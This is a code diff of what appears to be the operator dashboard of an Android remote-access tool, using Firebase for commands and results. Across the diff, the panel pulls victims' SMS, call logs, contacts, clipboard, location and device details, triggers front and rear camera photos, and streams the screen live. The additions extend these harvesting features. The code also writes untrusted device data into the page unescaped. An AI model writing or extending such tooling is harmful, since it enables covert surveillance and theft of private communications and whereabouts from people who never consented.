-                    <td><span class="call-type call-${typeClass}">${call.type}</span></td>
-                    <td>${formatDuration(call.duration)}</td>
-                    <td>${formatDate(call.date)}</td>
-                </tr>`;
-            });
-
-            html += '</tbody></table></div>';
-            callLogContainer.innerHTML = html;
-            switchTab('calls');
-            addLog(`📞 Call Log displayed: ${calls.length} calls from ${deviceName}`, 'success');
-            showToast(`Call log loaded: ${calls.length} calls`, 'success');
-        }
-
-        function displaySMS(messages, deviceName) {
-            if (!messages || messages.length === 0) {
-                smsContainer.innerHTML = '<div class="no-data"><i class="fas fa-envelope-open"></i><p>No SMS found</p></div>';
-                return;
-            }
-
-            let html = `<div style="margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
-                <span style="font-weight: 700; color: var(--primary);">📱 ${deviceName} - ${messages.length} messages</span>
-                <button class="btn btn-delete" onclick="clearSMS()"><i class="fas fa-trash"></i> Clear</button>
-            </div>`;
-
-            messages.forEach(msg => {
-                html += `
-                <div class="sms-item">
-                    <div class="sms-address">📱 ${msg.address}</div>
-                    <div class="sms-body">${msg.body}</div>
-                    <div class="sms-date">📅 ${formatDate(msg.date)}</div>
-                </div>`;
-            });
-
-            smsContainer.innerHTML = html;
-            switchTab('sms');
-            addLog(`💬 SMS displayed: ${messages.length} messages from ${deviceName}`, 'success');
-            showToast(`SMS loaded: ${messages.length} messages`, 'success');
-        }
-
-        function displayScreenshot(imageUrl, deviceName, width, height, cameraType) {
-            const badge = cameraType ? `<span style="background: rgba(102,126,234,0.9); color: white; padding: 3px 10px; border-radius: 12px; font-size: 0.8em; margin-left: 8px;">${cameraType === 'front' ? '🤳 Front' : '📷 Rear'} Camera</span>` : '';
-            
-            screenContainer.innerHTML = `
-                <div class="screen-info">📱 ${deviceName} ${badge} | ${width}x${height} | ${new Date().toLocaleTimeString()}</div>
-                <button class="screen-delete-btn" onclick="clearScreen()">
-                    <i class="fas fa-times"></i> Delete
-                </button>
-                <img src="${imageUrl}" style="max-width: 100%; max-height: 600px; border-radius: 8px;" alt="Screenshot from ${deviceName}">
-            `;
-            switchTab('screen');
-            addLog(`📸 Screenshot from ${deviceName} (${width}x${height})`, 'success');
-            showToast(`Screenshot received from ${deviceName}`, 'success');
+            screenContainer.innerHTML = '<div class="no-data"><i class="fas fa-stop-circle"></i><p>Stream stopped</p></div>';
         }
 
         // ============ LISTENERS ============
@@ -1468,11 +1835,7 @@
             const deviceName = device?.deviceName || 'Unknown Device';
             addLog(`🔌 Disconnected from ${deviceName}`, 'warning');
             showToast(`Disconnected from ${deviceName}`, 'warning');
-
-            if (streamActive) {
-                cleanupStream();
-            }
-
+            if (streamActive) cleanupStream();
             if (responseListener) {
                 database.ref(`devices/${connectedDeviceId}/commandResponse`).off('value', responseListener);
                 responseListener = null;
@@ -1485,7 +1848,6 @@
                 database.ref(`devices/${connectedDeviceId}/photos`).off('child_added', photosListener);
                 photosListener = null;
             }
-
             connectedDeviceId = null;
             controlPanel.style.display = 'none';
             capturedPhotos = [];
@@ -1496,7 +1858,6 @@
             if (screenshotListener) {
                 database.ref(`devices/${connectedDeviceId}/screenshots`).off('child_added', screenshotListener);
             }
-
             screenshotListener = database.ref(`devices/${deviceId}/screenshots`)
                 .orderByChild('timestamp')
                 .limitToLast(1)
@@ -1517,9 +1878,7 @@
             if (photosListener) {
                 database.ref(`devices/${connectedDeviceId}/photos`).off('child_added', photosListener);
             }
-
             capturedPhotos = [];
-            
             photosListener = database.ref(`devices/${deviceId}/photos`)
                 .orderByChild('timestamp')
                 .on('child_added', (snapshot) => {
@@ -1527,8 +1886,6 @@
                     if (photo && photo.image) {
                         capturedPhotos.push(photo);
                         renderPhotoGallery();
-                        
-                        // Also display latest photo in screen tab
                         displayScreenshot(
                             photo.image,
                             photo.deviceName || 'Unknown',
@@ -1536,7 +1893,6 @@
                             photo.height,
                             photo.camera
                         );
-                        
                         addLog(`📷 New photo from ${photo.camera} camera (${photo.width}x${photo.height})`, 'success');
                         showToast(`New ${photo.camera} camera photo received!`, 'camera');
                     }
@@ -1557,10 +1913,9 @@
                 switch(response.type) {
                     case 'screenshot_response':
                         if (response.data?.base64) {
-                            const deviceName = response.data.deviceName || 'Unknown';
                             displayScreenshot(
                                 `data:image/jpeg;base64,${response.data.base64}`,
-                                deviceName,
+                                response.data.deviceName || 'Unknown',
                                 response.data.width,
                                 response.data.height
                             );
@@ -1569,18 +1924,14 @@
 
                     case 'take_photo_response':
                         if (response.data?.base64) {
-                            const deviceName = response.data.deviceName || 'Unknown';
                             const cameraType = response.data.camera || 'unknown';
-                            
-                            // Display in screen tab
                             displayScreenshot(
                                 `data:image/jpeg;base64,${response.data.base64}`,
-                                deviceName,
+                                response.data.deviceName || 'Unknown',
                                 response.data.width,
                                 response.data.height,
                                 cameraType
                             );
-                            
                             addLog(`📷 Photo captured from ${cameraType} camera`, 'success');
                             showToast(`Photo captured from ${cameraType} camera!`, 'camera');
                             switchTab('camera');
@@ -1595,7 +1946,7 @@
                                 frameTimes = [];
                                 streamingBadge.style.display = 'inline-flex';
                                 streamStatus.style.display = 'flex';
-                                addLog(`📹 Live stream started`, 'success');
+                                addLog('📹 Live stream started', 'success');
                                 showToast('Live stream started!', 'success');
                                 switchTab('screen');
                             } else if (response.data.status === 'stopped') {
@@ -1603,7 +1954,7 @@
                                 addLog('📹 Stream stopped by device', 'info');
                                 showToast('Stream stopped', 'success');
                             } else if (response.data.status === 'already_streaming') {
-                                addLog('⚠️ Stream is already active on device', 'warning');
+                                addLog('⚠️ Stream already active on device', 'warning');
                                 showToast('Stream already active', 'warning');
                             }
                         }
@@ -1621,32 +1972,43 @@
                         }
                         break;
 
+                    case 'contacts_response':
+                        if (response.data) {
+                            displayContacts(
+                                response.data.contacts || [], 
+                                response.data.count || 0, 
+                                response.data.deviceName || 'Unknown'
+                            );
+                        }
+                        break;
+
                     case 'location_response':
                         if (response.data) {
-                            const { latitude, longitude, provider } = response.data;
-                            addLog(`📍 Location: ${latitude}, ${longitude} (${provider})`, 'info');
-                            showToast('Location received!', 'success');
+                            displayLocation(response.data, response.data.deviceName || 'Unknown');
                         }
                         break;
 
                     case 'device_info_response':
                         if (response.data) {
-                            addLog(`ℹ️ ${response.data.manufacturer} ${response.data.model} | Android ${response.data.androidVersion}`, 'info');
-                            showToast('Device info received', 'success');
+                            displayDeviceInfo(response.data, response.data.deviceName || 'Unknown');
                         }
                         break;
 
                     case 'clipboard_response':
-                        if (response.data?.text) {
-                            addLog(`📋 Clipboard: ${response.data.text.substring(0, 100)}...`, 'info');
-                            showToast('Clipboard retrieved', 'success');
+                        if (response.data) {
+                            displayClipboard(
+                                response.data.text || '', 
+                                response.data.isEmpty, 
+                                response.data.deviceName || 'Unknown'
+                            );
                         }
                         break;
 
-                    case 'contacts_response':
+                    case 'flashlight_response':
                         if (response.data) {
-                            addLog(`👥 Contacts: ${response.data.count || 0} contacts`, 'info');
-                            showToast(`${response.data.count || 0} contacts retrieved`, 'success');
+                            const status = response.data.status === 'on' ? 'ON 🔦' : 'OFF 💡';
+                            addLog(`🔦 Flashlight turned ${status}`, 'success');
+                            showToast(`Flashlight: ${status}`, 'success');
                         }
                         break;
 
@@ -1692,7 +2054,7 @@
                                 <i class="fas fa-times"></i> Close
                             </button>
                         </div>
-                        <img src="${frame.image}" style="max-width: 100%; max-height: 600px; border-radius: 8px;" alt="Live Stream from ${device?.deviceName || 'Device'}">
+                        <img src="${frame.image}" style="max-width: 100%; max-height: 600px; border-radius: 8px;" alt="Live Stream">
                     `;
                     
                     if (!streamActive) {
@@ -1739,7 +2101,6 @@
                         <div>
                             <div class="device-name">${device.deviceName || 'Unknown'}</div>
                             <div class="device-model">${device.manufacturer || ''} • Android ${device.androidVersion || '?'}</div>
-                            ${device.brand ? `<div class="device-model">${device.brand}</div>` : ''}
                         </div>
                     </div>
                     
@@ -1765,7 +2126,7 @@
                             </button>
                         ` : isInUseByOther ? `
                             <button class="btn btn-disabled" disabled onclick="event.stopPropagation()">
-                                <i class="fas fa-lock"></i> In Use - Cannot Access
+                                <i class="fas fa-lock"></i> In Use
                             </button>
                         ` : isOnline ? `
                             <button class="btn btn-connect" onclick="event.stopPropagation(); connectToDevice('${deviceId}')">
@@ -1773,7 +2134,7 @@
                             </button>
                         ` : `
                             <button class="btn btn-disabled" disabled onclick="event.stopPropagation()">
-                                <i class="fas fa-clock"></i> Device Offline
+                                <i class="fas fa-clock"></i> Offline
                             </button>
                         `}
                     </div>
@@ -1786,7 +2147,6 @@
                 card.addEventListener('click', () => {
                     if (isInUseByOther) {
                         showToast('This device is currently in use by another client', 'warning');
-                        addLog('⚠️ Cannot access - device is in use', 'warning');
                     } else if (!isOnline) {
                         showToast('This device is offline', 'warning');
                     } else if (!isConnected && isOnline && !isInUseByOther) {
@@ -1804,8 +2164,7 @@
             if (!device) { showToast('Device not found', 'error'); return; }
             if (device.status !== 'online') { showToast('Device is offline', 'error'); return; }
             if (device.connectionStatus === 'connected') { 
-                showToast('Device is already in use by another client', 'warning');
-                addLog('⚠️ Cannot connect - device is in use', 'warning');
+                showToast('Device already in use', 'warning');
                 return; 
             }
 
@@ -1870,7 +2229,6 @@
         function sendCommand(commandType, params = {}) {
             if (!connectedDeviceId) {
                 showToast('Connect to a device first!', 'warning');
-                addLog('⚠️ No device connected', 'warning');
                 return;
             }
 
@@ -1882,9 +2240,7 @@
 
             const commandId = database.ref(`devices/${connectedDeviceId}/commands`).push().key;
             
-            // Handle both cameras
             if (commandType === 'take_photo' && params.camera === 'both') {
-                // Send front camera command
                 database.ref(`devices/${connectedDeviceId}/commands/${commandId}_front`).set({
                     id: commandId + '_front',
                     type: 'take_photo',
@@ -1892,7 +2248,6 @@
                     params: { camera: 'front' }
                 });
                 
-                // Send back camera command with slight delay
                 setTimeout(() => {
                     database.ref(`devices/${connectedDeviceId}/commands/${commandId}_back`).set({
                         id: commandId + '_back',
@@ -1973,10 +2328,9 @@
         // ============ INIT ============
         function init() {
             setupListeners();
-            addLog('🟢 Control Panel Started with Camera Support', 'success');
+            addLog('🟢 Control Panel Started - Full Feature Support', 'success');
             addLog(`🆔 Client ID: ${myClientId}`, 'info');
-            addLog('📷 Camera capture ready - Front & Rear support', 'info');
-            addLog('📹 Live screen sharing ready', 'info');
+            addLog('📷 Camera | 📹 Stream | 💬 SMS | 📞 Calls | 👥 Contacts | 📍 Location | ℹ️ Device Info | 📋 Clipboard', 'info');
             setInterval(() => {
                 if (document.visibilityState === 'visible') updateStats();
             }, 5000);
